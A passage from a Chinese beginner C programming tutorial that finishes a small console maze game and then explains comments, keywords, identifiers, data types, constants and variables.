&#x27;</span>, <span class="string">&#x27; &#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27; &#x27;</span>, <span class="string">&#x27;#&#x27;</span>&#125;,</span><br><span class="line">        &#123;<span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27; &#x27;</span>, <span class="string">&#x27; &#x27;</span>, <span class="string">&#x27; &#x27;</span>, <span class="string">&#x27; &#x27;</span>, <span class="string">&#x27;#&#x27;</span>&#125;,</span><br><span class="line">        &#123;<span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>&#125;</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="comment">// 2.计算地图行数和列数</span></span><br><span class="line">    <span class="keyword">int</span> row = <span class="keyword">sizeof</span>(<span class="built_in">map</span>)/<span class="keyword">sizeof</span>(<span class="built_in">map</span>[<span class="number">0</span>]);</span><br><span class="line">    <span class="keyword">int</span> col = <span class="keyword">sizeof</span>(<span class="built_in">map</span>[<span class="number">0</span>])/ <span class="keyword">sizeof</span>(<span class="built_in">map</span>[<span class="number">0</span>][<span class="number">0</span>]);</span><br><span class="line">    <span class="comment">// 3.输出地图</span></span><br><span class="line">    printMap(<span class="built_in">map</span>, row, col);</span><br><span class="line">    <span class="comment">// 4.定义变量记录人物位置</span></span><br><span class="line">    <span class="keyword">int</span> pRow = <span class="number">2</span>;</span><br><span class="line">    <span class="keyword">int</span> pCol = <span class="number">1</span>;</span><br><span class="line">    <span class="comment">// 5.定义变量记录出口的位置</span></span><br><span class="line">    <span class="keyword">int</span> endRow = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">int</span> endCol = <span class="number">6</span>;</span><br><span class="line">    <span class="comment">// 6.控制人物行走</span></span><br><span class="line">    <span class="keyword">while</span> (<span class="string">&#x27;R&#x27;</span> != <span class="built_in">map</span>[endRow][endCol]) &#123;</span><br><span class="line">        <span class="comment">// 6.1提示用户如何控制人物行走</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;亲, 请输入相应的操作\n&quot;</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;w(向上走) s(向下走) a(向左走) d(向右走)\n&quot;</span>);</span><br><span class="line">        <span class="keyword">char</span> run;</span><br><span class="line">        run = getchar();</span><br><span class="line">        <span class="comment">// 6.2根据用户输入控制人物行走</span></span><br><span class="line">        <span class="keyword">switch</span> (run) &#123;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">&#x27;s&#x27;</span>:</span><br><span class="line">                <span class="keyword">if</span> (<span class="string">&#x27;#&#x27;</span> != <span class="built_in">map</span>[pRow + <span class="number">1</span>][pCol]) &#123;</span><br><span class="line">                    <span class="built_in">map</span>[pRow][pCol] = <span class="string">&#x27; &#x27;</span>;</span><br><span class="line">                    pRow++;<span class="comment">//3</span></span><br><span class="line">                    <span class="built_in">map</span>[pRow][pCol] = <span class="string">&#x27;R&#x27;</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">&#x27;w&#x27;</span>:</span><br><span class="line">                <span class="keyword">if</span> (<span class="string">&#x27;#&#x27;</span> != <span class="built_in">map</span>[pRow - <span class="number">1</span>][pCol]) &#123;</span><br><span class="line">                    <span class="built_in">map</span>[pRow][pCol] = <span class="string">&#x27; &#x27;</span>;</span><br><span class="line">                    pRow--;</span><br><span class="line">                    <span class="built_in">map</span>[pRow][pCol] = <span class="string">&#x27;R&#x27;</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">&#x27;a&#x27;</span>:</span><br><span class="line">                <span class="keyword">if</span> (<span class="string">&#x27;#&#x27;</span> != <span class="built_in">map</span>[pRow][pCol - <span class="number">1</span>]) &#123;</span><br><span class="line">                    <span class="built_in">map</span>[pRow][pCol] = <span class="string">&#x27; &#x27;</span>;</span><br><span class="line">                    pCol--;</span><br><span class="line">                    <span class="built_in">map</span>[pRow][pCol] = <span class="string">&#x27;R&#x27;</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">&#x27;d&#x27;</span>:</span><br><span class="line">                <span class="keyword">if</span> (<span class="string">&#x27;#&#x27;</span> != <span class="built_in">map</span>[pRow][pCol + <span class="number">1</span>]) &#123;</span><br><span class="line">                    <span class="built_in">map</span>[pRow][pCol] = <span class="string">&#x27; &#x27;</span>;</span><br><span class="line">                    pCol++;</span><br><span class="line">                    <span class="built_in">map</span>[pRow][pCol] = <span class="string">&#x27;R&#x27;</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 6.3重新输出行走之后的地图</span></span><br><span class="line">        printMap(<span class="built_in">map</span>, row, col);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;你太牛X了\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;想挑战自己,请购买完整版本\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * @brief printMap</span></span><br><span class="line"><span class="comment"> * @param map 需要打印的二维数组</span></span><br><span class="line"><span class="comment"> * @param row 二维数组的行数</span></span><br><span class="line"><span class="comment"> * @param col 二维数组的列数</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">printMap</span><span class="params">(<span class="keyword">char</span> <span class="built_in">map</span>[<span class="number">6</span>][<span class="number">7</span>] , <span class="keyword">int</span> row, <span class="keyword">int</span> col)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// 为了保证窗口的干净整洁, 每次打印都先清空上一次的打印</span></span><br><span class="line">    system(<span class="string">&quot;cls&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; row; i++) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; col; j++) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>, <span class="built_in">map</span>[i][j]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="注释的分类"><a href="#注释的分类" class="headerlink" title="注释的分类"></a>注释的分类</h2><ul>
<li><p>单行注释</p>
<ul>
<li>// 被注释内容</li>
<li>使用范围:任何地方都可以写注释：函数外面、里面，每一条语句后面</li>
<li>作用范围: 从第二个斜线到这一行末尾</li>
<li>快捷键:Ctrl+/</li>
</ul>
</li>
<li><p>多行注释</p>
<ul>
<li>/* 被注释内容 */</li>
<li>使用范围:任何地方都可以写注释：函数外面、里面，每一条语句后面</li>
<li>作用范围: 从第一个/<em>到最近的一个</em>/</li>
</ul>
</li>
</ul>
<h2 id="注释的注意点"><a href="#注释的注意点" class="headerlink" title="注释的注意点"></a>注释的注意点</h2><ul>
<li>单行注释可以嵌套单行注释、多行注释</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 好好学习 // hzy2003628.top</span></span><br><span class="line"><span class="comment">// /* 进我的博客好好学习 */</span></span><br><span class="line"><span class="comment">// 坚持</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<ul>
<li>多行注释可以嵌套单行注释</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">// 作者：HZY</span></span><br><span class="line"><span class="comment">// 描述：第一个C语言程序作用：这是一个主函数，C程序的入口点</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<ul>
<li>多行注释不能嵌套多行注释</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment">学习</span></span><br><span class="line"><span class="comment">     /*玩*/</span></span><br><span class="line"> 睡觉 </span><br><span class="line">*/</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="注释的应用场景"><a href="#注释的应用场景" class="headerlink" title="注释的应用场景"></a>注释的应用场景</h2><ul>
<li>思路分析</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/*</span><br><span class="line">     R代表一个人</span><br><span class="line">     #代表一堵墙</span><br><span class="line">//   0123456</span><br><span class="line">     ####### // 0</span><br><span class="line">     #   #   // 1</span><br><span class="line">     #R ## # // 2</span><br><span class="line">     #   # # // 3</span><br><span class="line">     ##    # // 4</span><br><span class="line">     ####### // 5</span><br><span class="line"></span><br><span class="line">     分析:</span><br><span class="line">     &gt;1.保存地图(二维数组)</span><br><span class="line">     &gt;2.输出地图</span><br><span class="line">     &gt;3.操作R前进(控制小人行走)</span><br><span class="line">      3.1.接收用户输入(scanf/getchar)</span><br><span class="line">      w(向上走) s(向下走) a(向左走) d(向右走)</span><br><span class="line">      3.2.判断用户的输入,控制小人行走</span><br><span class="line">         3.2.1.替换二维数组中保存的数据</span><br><span class="line">             (</span><br><span class="line">                1.判断是否可以修改(如果不是#就可以修改)</span><br><span class="line">                2.修改现有位置为空白</span><br><span class="line">                3.修改下一步为R</span><br><span class="line">             )</span><br><span class="line">      3.3.输出修改后的二维数组</span><br><span class="line">     4.判断用户是否走出出口</span><br><span class="line">*/</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<ul>
<li>对变量进行说明</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// 2.计算地图行数和列数</span><br><span class="line">int row = sizeof(map)/sizeof(map[0]);</span><br><span class="line">int col = sizeof(map[0])/ sizeof(map[0][0]);</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<ul>
<li>对函数进行说明</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/**</span><br><span class="line"> * @brief printMap</span><br><span class="line"> * @param map 需要打印的二维数组</span><br><span class="line"> * @param row 二维数组的行数</span><br><span class="line"> * @param col 二维数组的列数</span><br><span class="line"> */</span><br><span class="line">void printMap(char map[6][7] , int row, int col)</span><br><span class="line">&#123;</span><br><span class="line">    system(&quot;cls&quot;);</span><br><span class="line">    for (int i = 0; i &lt; row; i++) &#123;</span><br><span class="line">        for (int j = 0; j &lt; col; j++) &#123;</span><br><span class="line">            printf(&quot;%c&quot;, map[i][j]);</span><br><span class="line">        &#125;</span><br><span class="line">        printf(&quot;\n&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<ul>
<li>多实现逻辑排序</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// 1.定义二维数组保存迷宫地图</span><br><span class="line">char map[6][7] = &#123;</span><br><span class="line">    &#123;&#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;&#125;,</span><br><span class="line">    &#123;&#x27;#&#x27;, &#x27; &#x27;, &#x27; &#x27;, &#x27; &#x27;, &#x27;#&#x27; ,&#x27; &#x27;, &#x27; &#x27;&#125;,</span><br><span class="line">    &#123;&#x27;#&#x27;, &#x27;R&#x27;, &#x27; &#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27; &#x27;, &#x27;#&#x27;&#125;,</span><br><span class="line">    &#123;&#x27;#&#x27;, &#x27; &#x27;, &#x27; &#x27;, &#x27; &#x27;, &#x27;#&#x27;, &#x27; &#x27;, &#x27;#&#x27;&#125;,</span><br><span class="line">    &#123;&#x27;#&#x27;, &#x27;#&#x27;, &#x27; &#x27;, &#x27; &#x27;, &#x27; &#x27;, &#x27; &#x27;, &#x27;#&#x27;&#125;,</span><br><span class="line">    &#123;&#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;&#125;</span><br><span class="line">&#125;;</span><br><span class="line">// 2.计算地图行数和列数</span><br><span class="line">int row = sizeof(map)/sizeof(map[0]);</span><br><span class="line">int col = sizeof(map[0])/ sizeof(map[0][0]);</span><br><span class="line">// 3.输出地图</span><br><span class="line">printMap(map, row, col);</span><br><span class="line">// 4.定义变量记录人物位置</span><br><span class="line">int pRow = 2;</span><br><span class="line">int pCol = 1;</span><br><span class="line">// 5.定义变量记录出口的位置</span><br><span class="line">int endRow = 1;</span><br><span class="line">int endCol = 6;</span><br><span class="line">// 6.控制人物行走</span><br><span class="line">while (&#x27;R&#x27; != map[endRow][endCol]) &#123;</span><br><span class="line">    ... ...</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="使用注释的好处"><a href="#使用注释的好处" class="headerlink" title="使用注释的好处"></a>使用注释的好处</h2><ul>
<li>注释是一个程序员必须要具备的良好习惯</li>
<li>帮助开发人员整理实现思路</li>
<li>解释说明程序, 提高程序的可读性<ul>
<li>初学者编写程序可以养成习惯：先写注释再写代码</li>
<li>将自己的思想通过注释先整理出来，在用代码去体现</li>
<li>因为代码仅仅是思想的一种体现形式而已</li>
</ul>
</li>
</ul>
<h2 id="什么是关键字"><a href="#什么是关键字" class="headerlink" title="什么是关键字?"></a>什么是关键字?</h2><ul>
<li>关键字,也叫作保留字。是指一些被C语言赋予了特殊含义的单词</li>
<li>关键字特征:<ul>
<li>全部都是小写</li>
<li>在开发工具中会显示特殊颜色</li>
</ul>
</li>
<li>关键字注意点:<ul>
<li>因为关键字在C语言中有特殊的含义, 所以不能用作变量名、函数名等</li>
</ul>
</li>
<li>C语言中一共有32个关键字</li>
</ul>
<table>
<thead>
<tr>
<th align="center">1</th>
<th align="center">2</th>
<th align="center">3</th>
<th align="center">4</th>
<th align="center">5</th>
<th align="center">6</th>
<th align="center">7</th>
<th align="center">8</th>
</tr>
</thead>
<tbody><tr>
<td align="center">char</td>
<td align="center">short</td>
<td align="center">int</td>
<td align="center">long</td>
<td align="center">float</td>
<td align="center">double</td>
<td align="center">if</td>
<td align="center">else</td>
</tr>
<tr>
<td align="center">return</td>
<td align="center">do</td>
<td align="center">while</td>
<td align="center">for</td>
<td align="center">switch</td>
<td align="center">case</td>
<td align="center">break</td>
<td align="center">continue</td>
</tr>
<tr>
<td align="center">default</td>
<td align="center">goto</td>
<td align="center">sizeof</td>
<td align="center">auto</td>
<td align="center">register</td>
<td align="center">static</td>
<td align="center">extern</td>
<td align="center">unsigned</td>
</tr>
<tr>
<td align="center">signed</td>
<td align="center">typedef</td>
<td align="center">struct</td>
<td align="center">enum</td>
<td align="center">union</td>
<td align="center">void</td>
<td align="center">const</td>
<td align="center">volatile</td>
</tr>
</tbody></table>
<blockquote>
<p>这些不用专门去记住,用多了就会了。在编译器里都是有特殊颜色的。 我们用到时候会一个一个讲解这个些关键字怎么用,现在看一遍,有个印象就OK了</p>
</blockquote>
<h2 id="关键字分类"><a href="#关键字分类" class="headerlink" title="关键字分类"></a>关键字分类</h2><p><img src="/2022/01/15/C/3f73cc45cf0a0bb4e4f0f1b9c972b2be.png" alt="img"></p>
<h2 id="什么是标识符"><a href="#什么是标识符" class="headerlink" title="什么是标识符?"></a>什么是标识符?</h2><ul>
<li>从字面上理解,就是用来标识某些东西的符号，标识的目的就是为了将这些东西区分开来</li>
<li>其实标识符的作用就跟人类的名字差不多，为了区分每个人，就在每个人出生的时候起了个名字</li>
<li>C语言是由函数构成的，一个C程序中可能会有多个函数，为了区分这些函数，就给每一个函数都起了个名称, 这个名称就是标识符</li>
<li>综上所述: 程序员在程序中给函数、变量等起名字就是标识符</li>
</ul>
<h2 id="标识符命名规则"><a href="#标识符命名规则" class="headerlink" title="标识符命名规则"></a>标识符命名规则</h2><ul>
<li><p>只能由字母(a<del>z， A</del>Z)、数字、下划线组成</p>
</li>
<li><p>不能包含除下划线以外的其它特殊字符串</p>
</li>
<li><p>不能以数字开头</p>
</li>
<li><p>不能是C语言中的关键字</p>
</li>
<li><p>标识符严格区分大小写, test和Test是两个不同的标识符</p>
</li>
</ul>
<h2 id="标识符命名规范"><a href="#标识符命名规范" class="headerlink" title="标识符命名规范"></a>标识符命名规范</h2><ul>
<li><p>见名知意,能够提高代码的可读性</p>
</li>
<li><p>驼峰命名,能够提高代码的可读性</p>
</li>
<li><p>驼峰命名法就是当变量名或函数名是由多个单词连接在一起,构成标识符时,第一个单词以小写字母开始;第二个单词的首字母大写.</p>
</li>
<li><p>例如: myFirstName、myLastName这样的变量名称看上去就像驼峰一样此起彼伏</p>
</li>
<li><p><img src="/2022/01/15/C/2b8f50edb3b6449fb02a26a07c671ab4.png" alt="img"></p>
</li>
</ul>
<h2 id="什么是数据？"><a href="#什么是数据？" class="headerlink" title="什么是数据？"></a>什么是数据？</h2><ul>
<li><p>生活中无时无刻都在跟数据打交道</p>
<ul>
<li>例如:人的体重、身高、收入、性别等数据等</li>
</ul>
</li>
<li><p>在我们使用计算机的过程中，也会接触到各种各样的数据</p>
<ul>
<li>例如: 文档数据、图片数据、视频数据等</li>
</ul>
</li>
</ul>
<h2 id="数据分类"><a href="#数据分类" class="headerlink" title="数据分类"></a>数据分类</h2><p>静态的数据</p>
<ul>
<li><p><em><strong>静态数据是指一些永久性的数据，一般存储在硬盘中</strong></em>。硬盘的存储空间一般都比较大，现在普通计算机的硬盘都有500G左右，因此硬盘中可以存放一些比较大的文件</p>
</li>
<li><p>存储的时长：<em><strong>计算机关闭之后再开启，这些数据依旧还在，只要你不主动删掉或者硬盘没坏，这些数据永远都在</strong></em></p>
</li>
<li><p>哪些是静态数据：静态数据一般是以文件的形式存储在硬盘上，比如文档、照片、视频等。</p>
</li>
</ul>
<p>动态的数据</p>
<ul>
<li><p><em><strong>动态数据指在程序运行过程中，动态产生的临时数据，一般存储在内存中</strong></em>。内存的存储空间一般都比较小，现在普通计算机的内存只有8G左右，因此要谨慎使用内存，不要占用太多的内存空间</p>
</li>
<li><p>存储的时长：<em><strong>计算机关闭之后，这些临时数据就会被清除</strong></em></p>
</li>
<li><p>哪些是动态数据：当运行某个程序（软件）时，整个程序就会被加载到内存中，在程序运行过程中，会产生各种各样的临时数据，这些临时数据都是存储在内存中的。当程序停止运行或者计算机被强制关闭时，这个程序产生的所有临时数据都会被清除。</p>
</li>
<li><p>既然硬盘的存储空间这么大，为何不把所有的应用程序加载到硬盘中去执行呢？</p>
<ul>
<li>主要<em><strong>原因就是内存的访问速度比硬盘快N倍</strong></em></li>
</ul>
</li>
<li><p>静态数据和动态数据的相互转换</p>
</li>
</ul>
<p>​           也就是从磁盘加载到内存</p>
<ul>
<li>动态数据和静态数据的相互转换</li>
</ul>
<p>​            也就是从内存保存到磁盘</p>
<ul>
<li>数据的计量单位<ul>
<li>不管是静态还是动态数据，都是0和1组成的</li>
<li>数据越大，包含的0和1就越多</li>
</ul>
</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1 B(Byte字节) = 8 bit(位)</span><br><span class="line">// 00000000 就是一个字节</span><br><span class="line">// 111111111 也是一个字节</span><br><span class="line">// 10101010 也是一个字节</span><br><span class="line">// 任意8个0和1的组合都是一个字节</span><br><span class="line">1 KB(KByte) = 1024 B</span><br><span class="line">1 MB = 1024 KB</span><br><span class="line">1 GB = 1024 MB</span><br><span class="line">1 TB = 1024 GB</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="C语言数据类型"><a href="#C语言数据类型" class="headerlink" title="C语言数据类型"></a>C语言数据类型</h2><ul>
<li><em><strong>作为程序员, 我们最关心的是内存中的动态数据</strong></em>,因为我们写的程序就是在内存中运行的</li>
<li>程序在运行过程中会产生各种各样的临时数据,<em><strong>为了方便数据的运算和操作, C语言对这些数据进行了分类</strong></em>, 提供了丰富的数据类型</li>
<li>C语言中有4大类数据类型:<em><strong>基本类型、构造类型、指针类型、空类型</strong></em></li>
</ul>
<p><img src="/2022/01/15/C/73b03f1ce2062d094514e574bf3d0089.png" alt="img"></p>
<h2 id="什么是常量"><a href="#什么是常量" class="headerlink" title="什么是常量?"></a>什么是常量?</h2><ul>
<li>“量”表示数据。常量，则表示一些固定的数据，也就是不能改变的数据</li>
<li>就好比现实生活中生男生女一样, 生下来是男孩永远都是男孩, 生下来是女孩就永远都是女孩, 所以性别就是现实生活中常量的一种体现</li>
</ul>
<h2 id="常量的类型"><a href="#常量的类型" class="headerlink" title="常量的类型"></a>常量的类型</h2><p>整型常量</p>
<ul>
<li><p>十进制整数。例如:666,-120, 0</p>
</li>
<li><p>八进制整数,八进制形式的常量都以0开头。例如:0123,也就是十进制的83;-011,也就是十进 制的-9</p>
</li>
<li><p>十六进制整数,十六进制的常量都是以0x开头。例如:0x123,也就是十进制的291</p>
</li>
<li><p>二进制整数,逢二进一 0b开头。例如: 0b0010,也就是十进制的2</p>
</li>
</ul>
<p>实型常量</p>
<ul>
<li>小数形式<ul>
<li>单精度小数:以字母f或字母F结尾。例如:0.0f、1.01f</li>
<li>双精度小数:十进制小数形式。例如:3.14、 6.66</li>
</ul>
</li>
<li><ul>
<li>默认就是双精度</li>
<li>可以没有整数位只有小数位。例如: .3、 .6f</li>
</ul>
</li>
<li>指数形式<ul>
<li>以幂的形式表示, 以字母e或字母E后跟一个10为底的幂数</li>
</ul>
</li>
<li>上过初中的都应该知道科学计数法吧,指数形式的常量就是科学计数法的另一种表 示,比如123000,<em><strong>用科学计数法表示为1.23×10的5次方</strong></em></li>
<li><em><strong>用C语言表示就是1.23e5或1.23E5</strong></em></li>
<li>字母e或字母E后面的指数必须为整数</li>
<li>字母e或字母E前后必须要有数</li>
<li>字母e或字母E前后不能有空格</li>
<li>字符常量<ul>
<li>字符型常量都是用’’(单引号)括起来的。例如:‘a’、‘b’、‘c’</li>
<li>字符常量的单引号中只能有一个字符</li>
<li>特殊情况: 如果是转义字符,单引号中可以有两个字符。例如:’\n’、’\t’</li>
</ul>
</li>
<li>字符串常量<ul>
<li>字符型常量都是用””(双引号)括起来的。例如:“a”、“abc”、“lnj”</li>
<li>系统会自动在字符串常量的末尾加一个字符’\0’作为字符串结束标志</li>
</ul>
</li>
</ul>
<h2 id="什么是变量"><a href="#什么是变量" class="headerlink" title="什么是变量?"></a>什么是变量?</h2><ul>
<li><p>“量”表示数据。变量，则表示一些不固定的数据，也就是可以改变的数据</p>
</li>
<li><p>就好比现实生活中人的身高、体重一样, 随着年龄的增长会不断发生改变, 所以身高、体重就是现实生活中变量的一种体现</p>
</li>
<li><p>就好比现实生活中超市的储物格一样, 同一个格子在不同时期不同人使用,格子中存储的物品是可以变化的。张三使用这个格子的时候里面放的可能是尿不湿, 但是李四使用这个格子的时候里面放的可能是面包</p>
</li>
</ul>
<h2 id="如何定义变量"><a href="#如何定义变量" class="headerlink" title="如何定义变量"></a>如何定义变量</h2><p>格式1: 变量类型 变量名称 ;</p>
<ul>
<li><p>为什么要定义变量?</p>
<ul>
<li>任何变量在使用之前，必须先进行定义, 只有定义了变量才会分配存储空间, 才有空间存储数据</li>
</ul>
</li>
<li><p>为什么要限定类型?</p>
<ul>
<li>用来约束变量所存放数据的类型。一旦给变量指明了类型，那么这个变量就只能存储这种类型的数据</li>
<li>内存空间极其有限,不同类型的变量占用不同大小的存储空间</li>
</ul>
</li>
<li><p>为什么要指定变量名称?</p>
<ul>
<li>存储数据的空间对于我们没有任何意义, 我们需要的是空间中存储的值</li>
<li>只有有了名称, 我们才能获取到空间中的值</li>
</ul>
</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">int</span> a;</span><br><span class="line"><span class="keyword">float</span> b;</span><br><span class="line"><span class="keyword">char</span> ch;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<ul>
<li>格式2:变量类型 变量名称,变量名称;<ul>
<li>连续定义, 多个变量之间用逗号(,)号隔开</li>
</ul>
</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">int a,b,c;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<ul>
<li>变量名的命名的规范<ul>
<li>变量名属于标识符,所以必须严格遵守标识符的命名原则</li>
</ul>
</li>
</ul>
<h2 id="如何使用变量？"><a href="#如何使用变量？" class="headerlink" title="如何使用变量？"></a>如何使用变量？</h2><ul>
<li>可以利用=号往变量里面存储数据<ul>
<li>在C语言中,利用=号往变量里面存储数据, 我们称之为给变量赋值</li>
</ul>
</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">int</span> value;</span><br><span class="line">value = <span class="number">998</span>; <span class="comment">// 赋值</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>注意:</p>
<ul>
<li><p>这里的=号，并不是数学中的“相等”，而是C语言中的<em><strong>赋值运算符</strong></em>，作用是将右边的整型常量998赋值给左边的整型变量value</p>
</li>
<li><ul>
<li>赋值的时候,= 号的左侧必须是变量 (10=b,错误)</li>
<li>为了方便阅读代码, 习惯在 = 的两侧 各加上一个 空格</li>
</ul>
</li>
</ul>
<h2 id="变量的初始化"><a href="#变量的初始化" class="headerlink" title="变量的初始化"></a>变量的初始化</h2><ul>
<li>C语言中, 变量的第一次赋值，我们称为“初始化”</li>
<li>初始化的两种形式<ul>
<li>先定义,后初始化</li>
<li><code>int value; value = 998; // 初始化</code></li>
<li>定义时同时初始化</li>
<li><code>int a = 10; int b = 4, c = 2;</code></li>
<li>其它表现形式(不推荐)</li>
</ul>
</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">int</span> a, b = <span class="number">10</span>; <span class="comment">//部分初始化</span></span><br><span class="line"><span class="keyword">int</span> c, d, e;</span><br><span class="line">c = d = e =<span class="number">0</span>;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<ul>
<li>不初始化里面存储什么?<ul>
<li>随机数</li>
<li>上次程序分配的存储空间,存数一些 内容,“垃圾”</li>
<li>系统正在用的一些数据</li>
</ul>
</li>
</ul>
<h2 id="如何修改变量值"><a href="#如何修改变量值" class="headerlink" title="如何修改变量值?"></a>如何修改变量值?</h2><ul>
<li>多次赋值即可<ul>
<li>每次赋值都会覆盖原来的值</li>
</ul>
</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">int</span> i = <span class="number">10</span>;</span><br><span class="line">i = <span class="number">20</span>; <span class="comment">// 修改变量的值</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="变量之间的值传递"><a href="#变量之间的值传递" class="headerlink" title="变量之间的值传递"></a>变量之间的值传递</h2><ul>
<li>可以将一个变量存储的值赋值给另一个变量</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">int</span> a = <span class="number">10</span>;</span><br><span class="line"><span class="keyword">int</span> b = a; <span class="comment">// 相当于把a中存储的10拷贝了一份给b</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="如何查看变量的值"><a href="#如何查看变量的值" class="headerlink" title="如何查看变量的值?"></a>如何查看变量的值?</h2><ul>
<li>使用printf输出一个或多个变量的值</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">int</span> a = <span class="number">10</span>, c = <span class="number">11</span>;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;a=%d, c=%d&quot;</span>, a, c);</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>这里强调一下，有的题让你输出的有无前缀，输出的命令是不一样的，如果输出不做前缀要求那就按照上面的就可以，如果输出要前缀就需要按照下面的（这里举部分例子）</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%#o %#d %#x&quot;</span>,a,a,a);<span class="comment">//带个#就是输出带前缀的意思，o，d。x分别代表八进制，十进制，十六进制</span></span><br></pre></td></tr></table></figure>

<ul>
<li>输出其它类型变量的值</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">double</span> height = <span class="number">1.75</span>;</span><br><span class="line"><span class="keyword">char</span> blood = <span class="string">&#x27;A&#x27;</span>;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;height=%.2f, 血型是%c&quot;</span>, height,  blood);</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="变量的作用域"><a href="#变量的作用域" class="headerlink" title="变量的作用域"></a>变量的作用域</h2><ul>
<li><p>C语言中所有变量都有自己的作用域</p>
</li>
<li><p>变量定义的位置不同,其作用域也不同</p>
</li>
<li><p>按照作用域的范围可分为两种, 即局部变量和全局变量</p>
</li>
<li><p>局部变量</p>
<ul>
<li>局部变量也称为内部变量</li>
<li>局部变量是在<em><strong>代码块内</strong></em>定义的, 其作用域仅限于代码块内, 离开该代码块后无法使用</li>
</ul>
</li>
</ul>
